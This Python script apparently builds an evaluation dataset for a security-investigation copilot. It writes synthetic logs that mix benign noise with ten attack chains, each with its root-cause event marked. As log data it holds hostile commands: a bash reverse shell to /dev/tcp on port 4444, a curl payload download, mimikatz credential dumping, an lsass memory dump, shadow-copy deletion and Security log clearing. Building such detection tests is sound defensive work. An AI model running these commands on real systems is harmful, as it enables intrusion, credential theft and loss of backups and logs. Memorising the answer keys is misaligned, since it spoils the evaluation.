#!/usr/bin/env python3
"""
Writes datasets/copilot_scenarios.jsonl: investigation scenarios for the
copilot (Phase 10). Each has background activity, an attack chain with its
root-cause event marked (attrs.eid == root), and where the investigation
starts (an entity at the time of the last attack event, as an alert would).

Ten kinds, two variants each (different hosts, addresses, users, volumes).
Some are hard on purpose:

* user_pivot: the start is an account the attacker created; the root cause
  (the attacker's own login) is found only by pivoting to who created it;
* phish_download: the root cause (a download of the payload) carries no
  signal the copilot knows; the first signal is the payload running;
* the *_distractor variants put a benign admin action, with the same signal
  as the attack, inside the window before it.

    python tests/eval/ai/copilot_scenarios.py
"""

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

HERE = Path(__file__).resolve().parent
BASE = datetime(2026, 11, 10, 2, 0, tzinfo=timezone.utc)


class Builder:
    def __init__(self, sid: str, anchor: datetime, rnd: random.Random):
        self.sid, self.anchor, self.rnd, self.events, self.n = sid, anchor, rnd, [], 0

    def add(self, at: timedelta, service: str, host: str, msg: str, level: str = "info", src_ip: str = "",
            user_id: str = "", status: int = 0, attrs=None, eid: str | None = None) -> str:
        self.n += 1
        eid = eid or f"{self.sid}-{self.n}"
        self.events.append({"ts": (self.anchor + at).isoformat(), "service": service, "host": host, "level": level,
                            "msg": msg, "src_ip": src_ip, "user_id": user_id, "status": status,
                            "attrs": {**(attrs or {}), "eid": eid}})
        return eid

    def noise(self, linux_host: str, web_host: str, win_host: str):
        r = self.rnd
        for minutes in range(-480, 30, 30):
            self.add(timedelta(minutes=minutes), "CRON", linux_host, "(root) CMD (/usr/local/bin/backup.sh)")
        for minutes in sorted(r.sample(range(-470, 20), 12)):
            self.add(timedelta(minutes=minutes), "sshd", linux_host,
                     f"Accepted publickey for deploy from 10.0.1.{r.randint(10, 40)} port {r.randint(40000, 60000)} ssh2",
                     src_ip=f"10.0.1.{r.randint(10, 40)}", user_id="deploy")
        typo = timedelta(minutes=r.randint(-400, -60))
        self.add(typo, "sshd", linux_host, "Failed password for alice from 10.0.1.33 port 51515 ssh2",
                 src_ip="10.0.1.33", user_id="alice")
        self.add(typo + timedelta(seconds=20), "sshd", linux_host,
                 "Accepted password for alice from 10.0.1.33 port 51516 ssh2", src_ip="10.0.1.33", user_id="alice")
        for minutes in sorted(r.sample(range(-450, 20), 4)):
            self.add(timedelta(minutes=minutes), "sudo", linux_host,
                     "deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx",
                     user_id="deploy")
        for minutes in sorted(r.sample(range(-470, 25), 25)):
            path = r.choice(["/", "/index.html", "/api/orders", "/static/app.js", "/login"])
            ip = f"198.51.100.{r.randint(2, 200)}"
            self.add(timedelta(minutes=minutes), "nginx", web_host,
                     f'{ip} - - "GET {path} HTTP/1.1" 200 {r.randint(200, 9000)}', src_ip=ip, status=200)
        for minutes in sorted(r.sample(range(-470, 20), 6)):
            user = r.choice(["bob", "carol", "dave"])
            self.add(timedelta(minutes=minutes), "windows", win_host,
                     f"An account was successfully logged on. Account: {user} Logon type: 2", user_id=user,
                     attrs={"event_id": 4624})


def brute(b: Builder, host: str, ip: str, user: str, start: timedelta, count: int, windows: bool = False) -> str:
    for i in range(count):
        if windows:
            b.add(start + timedelta(seconds=4 * i), "windows", host,
                  f"An account failed to log on. Account: {user} Source: {ip}", level="warn", src_ip=ip,
                  user_id=user, attrs={"event_id": 4625})
        else:
            b.add(start + timedelta(seconds=4 * i), "sshd", host,
                  f"Failed password for {user} from {ip} port {50000 + i} ssh2", level="warn", src_ip=ip,
                  user_id=user)
    at = start + timedelta(seconds=4 * count + 30)
    if windows:
        return b.add(at, "windows", host, f"An account was successfully logged on. Account: {user} Source: {ip} "
                                          f"Logon type: 10", src_ip=ip, user_id=user, attrs={"event_id": 4624})
    return b.add(at, "sshd", host, f"Accepted password for {user} from {ip} port 50999 ssh2", src_ip=ip, user_id=user)


def scenario(kind: str, variant: int) -> dict:
    rnd = random.Random(f"{kind}-{variant}")
    sid = f"{kind}-{variant}"
    anchor = BASE + timedelta(hours=6 * len(KINDS) * variant + 6 * list(KINDS).index(kind))
    b = Builder(sid, anchor, rnd)
    linux, web, win = rnd.choice(["bastion-01", "bastion-02", "jump-3"]), rnd.choice(["web-1", "web-2"]), \
        rnd.choice(["WS-043", "WS-051", "DC01"])
    ip = f"{rnd.choice([45, 185, 203])}.{rnd.randint(10, 250)}.{rnd.randint(1, 250)}.{rnd.randint(2, 250)}"
    b.noise(linux, web, win)
    distractor = variant == 1
    subject = None
    if kind == "ssh_useradd":
        if distractor:
            b.add(timedelta(minutes=-170), "useradd", linux, "new user: name=jenkins, UID=1001, GID=1001",
                  user_id="root")
        root = brute(b, linux, ip, "root", timedelta(minutes=-12), rnd.randint(12, 20))
        last = b.add(timedelta(0), "useradd", linux, "new user: name=svc-backup, UID=1002, GID=1002", user_id="root")
        subject = {"type": "hostname", "value": linux}
    elif kind == "ssh_persistence":
        root = brute(b, linux, ip, "deploy", timedelta(minutes=-40), rnd.randint(8, 25))
        b.add(timedelta(minutes=-20), "sudo", linux,
              "deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab -e", user_id="deploy")
        last = b.add(timedelta(0), "crontab", linux, "(root) REPLACE (root)", user_id="root")
        subject = {"type": "hostname", "value": linux}
    elif kind == "webshell":
        root = b.add(timedelta(minutes=-20), "nginx", web, f'{ip} - - "POST /uploads/avatar.php HTTP/1.1" 200 512',
                     src_ip=ip, status=200)
        b.add(timedelta(minutes=-15), "nginx", web, f'{ip} - - "GET /uploads/avatar.php?cmd=id HTTP/1.1" 200 33',
              src_ip=ip, status=200)
        b.add(timedelta(minutes=-10), "auditd", web,
              f'type=EXECVE argc=4 a0="curl" a1="http://{ip}/x.sh" a2="-o" a3="/tmp/.x"', user_id="www-data")
        last = b.add(timedelta(0), "auditd", web, 'type=EXECVE argc=3 a0="chmod" a1="+x" a2="/tmp/.x"',
                     user_id="www-data")
        subject = {"type": "hostname", "value": web}
    elif kind == "credential_dump":
        if distractor:
            b.add(timedelta(minutes=-90), "windows", win,
                  "powershell.exe -NoProfile -EncodedCommand UwB0AGEAcgB0AC0AUwBsAGUAZQBwAA== (scheduled inventory)",
                  user_id="svc-inventory", attrs={"event_id": 4688})
        root = b.add(timedelta(minutes=-15), "windows", win, "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4A",
                     user_id="bob", attrs={"event_id": 4688})
        b.add(timedelta(minutes=-5), "windows", win, "procdump64.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp",
              user_id="bob", attrs={"event_id": 4688})
        last = b.add(timedelta(0), "windows", win, 'mimikatz.exe "sekurlsa::logonpasswords" exit', user_id="bob",
                     attrs={"event_id": 4688})
        subject = {"type": "hostname", "value": win}
    elif kind == "rdp_ransomware":
        root = brute(b, win, ip, "administrator", timedelta(minutes=-30), rnd.randint(10, 30), windows=True)
        last = b.add(timedelta(0), "windows", win, "vssadmin.exe delete shadows /all /quiet", user_id="administrator",
                     attrs={"event_id": 4688})
        subject = {"type": "hostname", "value": win}
    elif kind == "ip_start":
        for i in range(rnd.randint(20, 35)):
            b.add(timedelta(minutes=-60, seconds=10 * i), "nginx", web,
                  f'{ip} - - "GET /wp-login.php?{i} HTTP/1.1" 404 0', src_ip=ip, status=404)
        root = brute(b, linux, ip, "root", timedelta(minutes=-20), rnd.randint(10, 15))
        last = b.add(timedelta(0), "sudo", linux, "root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/bin/bash",
                     user_id="root", src_ip=ip)
        subject = {"type": "src_ip", "value": ip}
    elif kind == "user_pivot":
        root = brute(b, linux, ip, "root", timedelta(minutes=-190), rnd.randint(10, 20))
        b.add(timedelta(minutes=-180), "useradd", linux, "new user: name=svc-sync, UID=1003, GID=1003", user_id="root")
        last = b.add(timedelta(0), "sshd", linux, f"Accepted password for svc-sync from {ip} port 41000 ssh2",
                     src_ip=ip, user_id="svc-sync")
        subject = {"type": "user", "value": "svc-sync"}
    elif kind == "log_clearing":
        root = brute(b, win, ip, "helpdesk", timedelta(minutes=-25), rnd.randint(6, 12), windows=True)
        last = b.add(timedelta(0), "windows", win, "wevtutil cl Security", user_id="helpdesk", attrs={"event_id": 4688})
        subject = {"type": "hostname", "value": win}
    elif kind == "reverse_shell":
        root = b.add(timedelta(minutes=-8), "nginx", web,
                     f'{ip} - - "GET /index.php?c=bash+-c+id HTTP/1.1" 200 41', src_ip=ip, status=200)
        last = b.add(timedelta(0), "auditd", web, f'type=EXECVE argc=3 a0="bash" a1="-c" a2="bash -i >& '
                                                   f'/dev/tcp/{ip}/4444 0>&1"', user_id="www-data")
        subject = {"type": "hostname", "value": web}
    elif kind == "phish_download":
        root = b.add(timedelta(minutes=-12), "proxy", win,
                     f"GET http://{ip}/invoice-2026-11.zip 200 application/zip", src_ip="10.0.5.20", user_id="carol")
        b.add(timedelta(minutes=-6), "windows", win, "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
              user_id="carol", attrs={"event_id": 4688})
        last = b.add(timedelta(0), "windows", win, f"Outbound connection to {ip}:443 from powershell.exe",
                     user_id="carol")
        subject = {"type": "hostname", "value": win}
    else:
        raise ValueError(kind)
    at = next(e["ts"] for e in b.events if e["attrs"]["eid"] == last)
    return {"id": sid, "kind": kind, "variant": variant, "root": root,
            "subject": {"kind": "entity", **subject, "at": at},
            "events": sorted(b.events, key=lambda e: e["ts"])}


KINDS = ["ssh_useradd", "ssh_persistence", "webshell", "credential_dump", "rdp_ransomware", "ip_start", "user_pivot",
         "log_clearing", "reverse_shell", "phish_download"]


def main():
    rows = [scenario(kind, variant) for variant in (0, 1) for kind in KINDS]
    out = HERE / "datasets" / "copilot_scenarios.jsonl"
    out.write_text("".join(json.dumps(r, sort_keys=True) + "\n" for r in rows))
    print(f"{out}: {len(rows)} scenarios, {sum(len(r['events']) for r in rows)} events")


if __name__ == "__main__":
    main()
